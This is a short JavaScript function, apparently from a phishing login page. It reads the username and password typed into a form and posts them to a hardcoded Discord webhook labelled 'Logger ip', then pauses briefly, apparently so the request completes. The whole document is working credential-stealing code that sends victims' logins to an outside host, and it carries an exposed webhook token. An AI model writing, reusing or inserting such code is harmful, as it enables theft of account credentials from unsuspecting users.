function sendMessage() {
    function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
      currentDate = Date.now();
    } while (currentDate - date < milliseconds);
  }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1035136544618586202/Ct3VaUtZn_pAM-D1ymstVpq3MfbZUmq4mjkt-edPrL8Xu8jp_duGXlbR_UyQ3AIlCLm7");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        username: "Logger ip",
        avatar_url: "https://cdn.discordapp.com/attachments/938458372292886608/978691418233135174/logo.png",
        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      }
      request.send(JSON.stringify(params));
      sleep(400)

    }
